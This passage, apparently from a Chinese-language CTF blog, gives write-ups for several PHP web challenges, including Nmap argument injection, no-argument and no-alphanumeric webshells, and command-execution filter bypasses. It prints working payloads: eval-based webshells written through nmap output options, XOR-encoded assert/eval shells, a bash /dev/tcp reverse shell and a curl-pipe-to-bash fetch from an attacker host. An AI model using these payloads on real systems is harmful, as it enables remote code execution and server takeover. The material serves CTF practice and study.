class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考之前学习PHP代码审计的<a href="https://ca0y1h.top/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5/#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0Day5%E2%80%94%E2%80%94escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93">一篇文章</a>，escapeshellarg函数和escapeshellcmd函数同时使用会导致单引号逃逸。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">&quot;&#x27; &lt;?php phpinfo();?&gt; -oN shell.php &#x27;&quot;</span>;</span><br><span class="line">$host = (<span class="keyword">string</span>)$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;host:&quot;</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$arg = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;arg:&quot;</span>.$arg;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$cmd = escapeshellcmd($arg);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;cmd:&quot;</span>.$cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于单个单引号, escapeshellarg()函数转义后,还会在左右各加一个单引号,但escapeshellcmd()函数是直接加一个转义符。<br>对于成对的单引号, escapeshellcmd()函数默认不转义,但escapeshellarg()函数转义。<br>host参数先经过escapeshellarg()再经过escapeshellcmd()就会出现问题。<br>escapeshellarg 先转义了一个单引号,然后引入了一对单引号, escapeshellcmd 不会转义成对的单引号,但是会转义转移符<code>\</code>，这样, 转移符作用失效,逃逸出来一个单引号。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php &#96;cat &#x2F;flag&#96;;?&gt; -oN shell.php &#39;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯2020-朱雀组-Nmap">网鼎杯2020 朱雀组 Nmap</h2><h3 id="考点-v2">考点</h3><ul><li>Nmap参数注入</li></ul><h3 id="解题-v2">解题</h3><p>和上面一道题比较像了，都是考察Nmap参数注入，但是没有显示源码。</p><p>直接用Online Tool的payload进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure><p>提示hacker，Fuzz之后发现应该是过滤PHP关键字，改用短标签和phtml后缀绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; &lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</span><br></pre></td></tr></table></figure><p>没有提示其他黑名单信息，访问当前目录下的<code>hack.phtml</code>文件存在，用蚁剑连接，拿到flag。</p><blockquote><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/145906109">https://zhuanlan.zhihu.com/p/145906109</a></p></blockquote><h2 id="RoarCTF2019-Easy-Calc">RoarCTF2019 Easy Calc</h2><h3 id="考点-v3">考点</h3><ul><li>代码审计</li><li>PHP的字符串解析特性Bypass：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></li></ul><h3 id="解题-v3">解题</h3><p>查看源代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">//对输入的特殊字符进行URL编码并以GET方式访问请求</span></span><br><span class="line">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),      </span><br><span class="line">            type:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问<code>calc.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第13行<code>eval</code>可以执行PHP代码，测试发现<code>num</code>参数不能输入非数字的值，否则会直接500。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><blockquote><p>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。</p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619120244.png" alt=""></p><p>代码中过滤了<code>/</code>，用<code>chr</code>绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619122312.png" alt=""></p><p>读取<code>/f1agg</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><h2 id="watevrCTF-2019-Supercalc">watevrCTF-2019 Supercalc</h2><h3 id="TODO-v3">TODO</h3><h2 id="RCTF2019-calcalcalc">RCTF2019 calcalcalc</h2><h3 id="TODO-v4">TODO</h3><h2 id="De1CTF-2019-9calc">De1CTF 2019 9calc</h2><h3 id="TODO-v5">TODO</h3><h2 id="GXYCTF2019-禁止套娃">GXYCTF2019 禁止套娃</h2><h3 id="考点-v4">考点</h3><ul><li>Git源码泄露</li><li>无参数webshell</li></ul><h3 id="解题-v4">解题</h3><p>dirmap扫描发现有Git目录，用GitHack download下来，审计代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个正则表达式<code>/[a-z,_]+\((?R)?\)/</code>很明显是无参数webshell，直接上payload查看当前路径下的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;var_dump(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702000024.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><blockquote><p>array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br>array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</p></blockquote><p>当然，还可以写header字段，然后用get_all_header()函数获得<code>flag.php</code>文件。</p><h2 id="BJDCTF-2nd-duangShell">BJDCTF 2nd duangShell</h2><h3 id="考点-v5">考点</h3><ul><li>swp文件泄露</li><li>反弹shell</li></ul><h3 id="解题-v5">解题</h3><p>打开题目提示swp文件泄露，访问<code>.index.php.swp</code>下载文件，<code>vim -r index.php.swp</code>恢复文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察源代码之后发现是绕过过滤之后命令执行的题目。</p><p>因为过滤了$符号，所以不能采用这种黑名单拼接的方式绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;ca;b&#x3D;t;c&#x3D;flag;&#96;&#96;$ab&#96; &#96;$c</span><br></pre></td></tr></table></figure><p>禁用了base64之后不能使用base64编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot; | base64 -d</span><br></pre></td></tr></table></figure><p>而且exec()函数是没有回显的，又想了一些奇怪的姿势，着实不行，看师傅们的博客吧。</p><p>这道题用到的是反弹shell，先用小号开一个Linux靶机，用SSH登录上去，查看ip地址。</p><p>在<code>/var/www/html/re_shell.txt</code>写入反弹shell命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>再监听本地的对应端口，在靶机上访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend&#x3D;curl http:&#x2F;&#x2F;[ip]&#x2F;[文件名]|bash</span><br></pre></td></tr></table></figure><p>本机获得shell后，查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name *flag*</span><br></pre></td></tr></table></figure><h2 id="极客大挑战2019-RCE-ME">极客大挑战2019 RCE ME</h2><h3 id="考点-v6">考点</h3><ul><li>无数字字母的webshell</li><li>disable_function绕过</li></ul><h3 id="解题-v6">解题</h3><p>审计代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这个知识点都要考烂了，先用phpinfo验证一下，直接给payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706133157.png" alt=""></p><p>先构造一个shell，用蚁剑连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[_]($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure><blockquote><p>PHP7.0 还可以使用assert来执行php语句，PHP7.1之后就不行了。</p></blockquote><p>然后再加载<a href="https://github.com/Medicean/as_bypass_php_disable_functions">绕过disable_function的插件</a>，运行readflag即可。</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706135436.png" style="zoom:67%;" /><h2 id="WUSTCTF2020-朴实无华">WUSTCTF2020 朴实无华</h2><h3 id="考点-v7">考点</h3><ul><li>intval函数绕过</li><li>md5弱类型</li><li>Linux命令空格和cat绕过</li></ul><h3 id="解题-v7">解题</h3><p>根据hint访问<code>fl4g.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>套娃题，一层一层的来看。</p><p>第一层是用科学计数法绕过intval函数的if判断，给一个demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($a);</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">$b=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($b+<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 30001</span></span><br></pre></td></tr></table></figure><p>这是因为进行+1操作的时候会先将$a的科学计数法解析然后再加1。</p><blockquote><p>以下只适合php7.0及以下版本</p></blockquote><p>第二层是md5的弱比较</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">md5值：0e291242476940776845150308577824</span><br><span class="line">0e2159620</span><br><span class="line">md5值：0e2159620</span><br></pre></td></tr></table></figure><p>第三层是绕过空格和cat命令，空格的代替方式<code>$&#123;IFS&#125;</code>、<code>$IFS</code>，cat的代替方式<code>ca\t</code>、<code>sort</code>、<code>more</code>等等。</p><h2 id="CISCN2019-华北赛区-love-math">CISCN2019 华北赛区 love math</h2><h3 id="考点-v8">考点</h3><ul><li>代码审计</li></ul><h3 id="解题-v8">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span 